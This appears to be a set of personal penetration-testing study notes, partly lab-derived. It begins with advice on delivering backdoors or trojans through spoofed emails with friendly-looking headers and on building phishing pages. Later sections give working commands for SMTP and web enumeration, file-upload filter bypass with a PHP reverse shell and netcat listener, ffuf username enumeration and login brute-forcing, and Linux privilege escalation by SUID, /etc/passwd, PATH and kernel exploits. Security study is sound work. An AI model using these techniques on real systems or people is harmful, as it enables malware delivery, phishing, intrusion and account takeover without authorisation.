However if you want to attach a backdoor, trojan, virus file…You can use a service such as dropbox to deliver the file(i.e we first upload and copy it’s URL for delivery purposes) . Or we can send deliver it manually -a file attachment flag and {file_path}. Also ensure to use the advanced option -o message-header=HEADER to change the incoming message header to resemble a friendly mail. 

*EMAIL Spoofing2* Use of PHP mailers requires a web hosting plan, free web-hosting plan don’t gives access to Mail Servers. Creating a domain with a reputable providers that has both PHP MAILERS && SMTP SERVERS is a Plus. Using a file named SEND.PHP we upload this to our domain provider user access page. Note files are served from domain to endusers using I.e www.QueryParams.com/{file_path}
 
*EMAIL Phishing* Use of tool names BLACKEYE to create fake default landing pages or custom landing pages. It generates a link via 

## Enumerating and Exploiting Vulnerabilities / MisConfiguration in SMTP
*Enumerating Server Details
Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "smtp_version" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.
*Enumerating Users from SMTP
The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users
We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "smtp_enum" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.
*Alternatives
It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.


Website Hacking & Attacks === https://github.com/danielmiessler/SecLists/raw/master/Discovery
## Web-Enumeration >> Gobuster is a tool used to brute-force:  Since this tool is written in Go, you must install the Go language/compiler/etc. 
Sudo apt install gobuster -> via apt package manager 
go install github.com/OJ/gobuster/v3@latest -> via golang package manager
git clone https://github.com/OJ/gobuster.git -> via Git clone Build
    URIs (directories and files) in web sites.
    DNS subdomains (with wildcard support).
    Virtual Host names on target web servers.
    Open Amazon S3 buckets
    Open Google Cloud buckets
    TFTP servers
    gobuster help - outputs the top-level help.
    gobuster help <mode> - outputs the help specific to that mode.

Dir Mode - URIs (directories and files) in web sites
Dirbuster has a "dir”/file Enumeration mode that allows the user to enumerate website directories. Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Let’s say We finally managed to upload our Webshell on an Upload form Now we might need to bruteforce directories in order to locate the folder where the uploaded files are stored but we can also guess it. The gobuster immediately found the /uploads directory. We don't have permission to access the directory but we can try access our uploaded file.
Syntax->http://{TARGET_IP}/uploads/php-reverse-shell.php && nc -lvnp port#
To use "dir" mode, you start by typing gobuster dir. This tells Gobuster that you want to perform a directory search, instead of one of its other methods .  After that, you will need to add the URL and wordlist using the -u and -w options, respectively. With filters for file extension(-x) types.
gobuster dir -u <websiteURL> -w /usr/share/wordlists/dirbuster/directory*
gobuster dir -u https://mysite.com/path/to/folder -c 'session=hijackedSession123456' -t 50 -w common-files.txt -x .php,.html

 Dns Mode - DNS subdomains (with wildcard support)
To use "dns" subdomain enumeration mode, you start by typing ‘gobuster dns’.  This tells Gobuster that you want to perform a sub-domain brute-force, After that, you will need to add the domain and wordlist using the -d and -w options, respectively. Like so:
gobuster dns -d <TargetFQDNDomain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

VHOST mode - Virtual Host names on target web servers.
Virtual hosts are different websites on the same machine. Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. {Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.} , but don't be deceived! Virtual Hosts are IP based and are running on the same server. This is not usually apparent to the end-user.
To use "vhost" mode, you start by typing gobuster vhost. This tells Gobuster that you want to perform a virtual host brute-force. Using VHOST enumeration mode (you most probably want to use the IP address as the URL parameter). After that, you will need to add the domain and wordlist using the -u and -w options, respectively. Like so:
gobuster vhost -u http://IP/FQDN -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

s3 Mode - Uses aws bucket and GCS Mode - google cloud bucket
gobuster s3 -w bucket-names.txt && gobuster gcs -w bucket-names.txt

Fuzz Mode - Uses fuzzing mode similar to FFUF tools
Fuzzing for PHP hard-coded parameters in WebPages PHP scripts
Fuzzing for parameter values
gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt

## Web-Enumeration >> WPScan framework is capable of enumerating & researching a few security vulnerability categories present WordPress sites - including - but not limited to:
1. Sensitive Information Disclosure (Plugin & Theme installation versions for disclosed vulnerabilities or CVE's)
2. Path Discovery (Looking for misconfigured file permissions i.e. wp-config.php)
 3. Weak Password Policies (Password bruteforcing)
 4. Presence of Default Installation (Looking for default files)
 5. Testing Web Application Firewalls (Common WAF plugins)

Before using WPScan, it is highly recommended that you update this database before performing any scans. Simply run wpscan --update 
Enumerating for Installed Themes by using the --enumerate flag with the t 
wpscan --url <hostname> --enumerate t
Enumerating for Installed Plugins by using the --enumerate flag with the p
wpscan --url <hostname> --enumerate p 
"Directory Listing" occurs when there is no file present that the webserver has been told to process
Enumerating for Users by using the --enumerate flag with the u
wpscan --url <hostname> --enumerate u 
The "Vulnerable" Flag
WPScan has the v argument for the --enumerate flag. We provide this argument alongside another (such as p for plugins). For example, our syntax would like so: wpscan --url <hostname> --enumerate vp 
Note, that this requires setting up WPScan to use the WPVulnDB API which is out-of-scope for this room. 
Adjusting WPScan's Aggressiveness (WAF)
Unless specified, WPScan will try to be as least "noisy" as possible. Lots of requests to a web server can trigger things such as firewalls and ultimately result in you being blocked by the server.
This means that some plugins and themes may be missed by our WPScan. Luckily, we can use arguments such as --plugins-detection and an aggressiveness profile (passive/aggressive) to specify this. For example: --plugins-detection aggressive

## WebServers-Enumeration >> Nikto is capable of performing an assessment on all types of webservers (and isn't application-specific such as WPScan.). Nikto can be used to discover possible vulnerabilities including:
Sensitive files, Outdated servers and programs (i.e. vulnerable web server installs), Common server and software misconfigurations (Directory indexing, cgi scripts, x-ss protections)

Basic Scanning nikto -h <vulnerable_ip>
This scan type will retrieve the headers advertised by the webserver or application (I.e. Apache2, Apache Tomcat, Jenkins or JBoss) and will look for any sensitive files or directories (i.e. login.php, /admin/, etc)
canning Multiple Hosts & Ports

Parsing Nmap output to Nikto >> nmap -p80 hostname/24 -oG - | nikto -h - 
Scanning Several Ports on a Host >> nikto -h vulnerable_ip -p 80,8000,8080
Choosing plugins that are appropriate to our target using -Plugin flag. You can use the --list-plugins flag with Nikto to list the plugins, Some interesting plugins include: 

apacheusers  Attempt to enumerate Apache HTTP Authentication Users
cgi	Look for CGI scripts that we may be able to exploit
robots	Analyse the robots.txt file which dictates what files/folders we are able to navigate to
dir_traversal Attempt to use a directory traversal attack (i.e. LFI) to look for system files such as /etc/passwd on Linux (http://ip_address/application.php?view=../../../../../../../etc/passwd)
We can increase the verbosity of our Nikto scan by providing the following arguments with the -Display flag. 
1	Show any redirects that are given by the web server. 	
2	Show any cookies received 	E	Output any errors	

Tuning Your Scan for Vulnerability Searching
Nikto has several categories of vulnerabilities that we can specify our scan to enumerate and test for.  We can use the -Tuning flag and provide a value in our Nikto scan.

## ServerMessageBlock (SMB)-Enumeration >> 
Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
Samba is based on the common client/server protocol of Server Message Block (SMB). 
*Enum4linux is a tool for enumerating information from Windows and Samba systems. It is written in PERL and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. The samba package is therefore a dependency.

*Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!
i.e nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target-IP>
￼

Bypassing Client-Side Filtering : There are four easy ways to bypass your average client-side file upload filter https://tryhackme.com/room/uploadvulns#

“Turn off Javascript in your browser” -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
“Intercept and modify the incoming page”. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. 
“Intercept and modify the file upload” Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). 
“Send the file directly to the upload point”. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. The syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command

Bypassing Server-Side Filtering: Either by Manipulating File Extensions or Magic Numbers(The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it's possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist) 

Magic Number validation: Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file: 89 50 4E 47 0D 0A 1A 0A.

## Authentication Bypass
We can use the existence of this error message(an account with this username already exists.) to produce a list of valid usernames already signed up on a website by using the FFUF tool below. The FFUF tool uses a list of commonly used usernames to check against for any matches.
ffuf -w /usr/share/wordlists/SecLists/…..txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://{URL} -mr "username already exists"

In the above example, the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.

>> Brute-Forcing the Login
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://{URL} -fc 200
Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.


## Linux Privilege Escalation
The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.
Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh 
“As LinEnum is for Linux, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations."
Also winPeas.Bat https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat for windows enumeration
How do you get LinEnum on the target machine? Either through Python dedicated web server or copy & pasting the code via Nano/Vim Editor on Target Machine, Note: change permissions of this file using chmod +x allow file to be executable

Horizontal Privilege Escalation >> Occurs when a user can perform an action or access data of another user with the same level of permissions.
Vertical Privilege Escalation >> Occurs when a user can perform an action or access data of another user with a higher level of permissions.
Note: “Binary exploits of a root owned program are far less dangerous than a kernel exploit because even if the service crashes, the host machine will not crash and the services will probably auto restart.’

1. Abusing SUID/GUID Files (Set owner User ID up on execution) is a special type of file permissions given to a file. The Set User ID (SUID) allows a user to run a program as the owner of the program file rather than as themselves. If this is root, it runs with root permissions. It can allow us to escalate privileges. The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges! SGID (Set Group ID)
*Manually Finding SUID Binaries
We can enumerate SUID capable files on the target system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: "find / -perm -u=s -type f 2>/dev/null" to search the file system for SUID/GUID files. Let's break down this command.
This permission bit is the SUID, when a file has this permission set, it allows the users who launched the program to get the file owner's permission as well as execution permission, in this case root. 
Just like regular permissions there are two ways to modify SUID & SGID permissions.
Symbolic way: >> $ sudo chmod u+s myfile $ sudo chmod g+s myfile
Numerical way: >> sudo chmod 4755 myfile  $ sudo chmod 2555 myfile
As you can see the SUID is denoted by a 4 and pre-pended to the permission set. You may see the SUID denoted as a capital S this means that it still does the same thing, but it does not have execute permissions.
Similar to the set user ID permission bit, there is a set group ID (SGID) permission bit. This bit allows a program to run as if it was a member of that group
One last special permission bit I want to talk about is the sticky bit.
This permission bit, "sticks a file/directory" this means that only the owner or the root user can delete or modify the file. This is very useful for shared directories
You'll see a special permission bit at the end here t, this means everyone can add files, write files, modify files in the /tmp directory, but only root can delete the /tmp directory.
Modify sticky bit
$ sudo chmod +t mydir
$ sudo chmod 1755 mydir
The numerical representation for the sticky bit is 1

2. Exploiting a writable /etc/passwd
It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

3.The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute. We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

4.Exploiting PATH Variable Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead! As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root! BE sure you can answer the questions below before trying this.

    What folders are located under $PATH
    Does your current user have write privileges for any of these folders?
    Can you modify $PATH?
    Is there a script/application you can start that will be affected by this vulnerability?

5.Exploiting misconfigured SUDO rights to get root access
sudo -l >> Prints the commands which we are allowed to run as SUDO

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
The Kernel exploit methodology is simple;
    Identify the kernel version
    Search and find an exploit code for the kernel version of the target system
    Run the exploit 

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit. 

✅Information Gathering of Target website such as *IP address, Domain Name info, Technologies used, other website on the same server, DNS records, Unlisted files//sub-domains//directories* 
https://whois.domaintools.com, https://toolbar.netcraft.com, https://www.robtex.com
One server can serve a number of websites, gaining access to one can help gaining access to others. If any is compromised, we can penetrate and gain proper access to the other websites. Likewise, a Website may have subdomains….finding vulnerabilities in this subdomains i.e Discover more information, New Web Applications, Management areas, Beta/Experimental features increases the attack surface… This discoveries can be made using a tools named *KNOCKPY*.

✅Preventing M_I_T_M Attack ➡️ Download XARP tools, Analyzing ARP tables & Wireshark to detect ARP poisioning. However detection is not the same was prevention. Solutions
1. Encrypt Your Traffic Using VPN (extra layer of encryption)
2. Https everywhere Plugins && Several other blockers

✅*For more ANONYMITY https://tails.boum.org/index.en.html 	https://geti2p.net/en/
Use *TORCTL* Terminal commands to operate Torctl: Enter any of the following commands in the Terminal and press Enter to operate Torctl::
Display list of commands: torctl --help
Find your IP address: torctl ip
Start Torctl and start routing traffic: sudo torctl start
Stop Torctl: sudo torctl stop
Check Torctl status: torctl status
Change your IP address on the Tor Network: sudo torctl chngid
Change MAC address: sudo torctl chngmac
Recover original MAC address: sudo torctl rvmac
Automatically start Torctl on startup: sudo systemctl enable torctl-autostart.service
Remove auto Torctl from startup services: sudo systemctl disable torctl-autostart.service
Add automatic memory cleaning when you shut down your computer: sudo systemctl enable torctl-autowipe.service
Disable automatic memory cleaning: sudo systemctl disable torctl-autowipe.service

✅Kali Whoami status: The purpose of the Whoami tool makes you as anonymous as possible on Kali linux. It is an user friendly with its ease of use and simple interface. It follows two different paths to ensure the highest possible level of anonymity. Finally, don't forget that there is never a hundred percent security on the internet! *Kali-whoami start*
 Anti Mitm             : Disable
 Ip changer            : Disable
 Dns changer           : Disable
 Mac changer           : Disable
 Timezone changer      : Disable
 Hostname changer      : Disable
 Browser anonymization : Disable
https://dnsleak.com/
Extra Anonymity with Proxies. https://proxy-seller.ru/ 

✅Installing Kali/Tools on the cloud
Watch https://www.youtube.com/watch?v=111ZDMKVTL4

✅PREVENTION malicious downloads using MD5 https://www.winmd5.com/md5_software.html
However this won’t work if the website you’re downloading from is intentional serving you a malicious software with backdoor in which they can manipulate the checksum. Analyzing trojans using online sandbox I.E https://www.hybrid-analysis.com/



### Wordlists Links
ftp://ftp.openwall.com/pub/wordlists/
http://www.openwall.com/mirrors/
http://www.outpost9.com/files/WordLists.html
http://www.vulnerabilityassessment.co.uk/passwords.htm
http://packetstormsecurity.org/Crackers/wordlists/
http://www.ai.uga.edu/ftplib/natural-language/moby/
http://www.cotse.com/tools/wordlists1.htm
http://www.cotse.com/tools/wordlists2.htm
http://wordlist.sourceforge.net/
Torrent Website
1337x.to
rarbg.to
nyaa.si
limetorrents.info
zooqle.com
katcr.co
torrentdownloads.me
magnetdl.com
torlock.com
pcgamestorrents.com
arenabg.com
torrentgalaxy.org
ettv.tv
torrentfunk.com
btdig.com
yourbittorrent.com
monova.org
idope.se
  

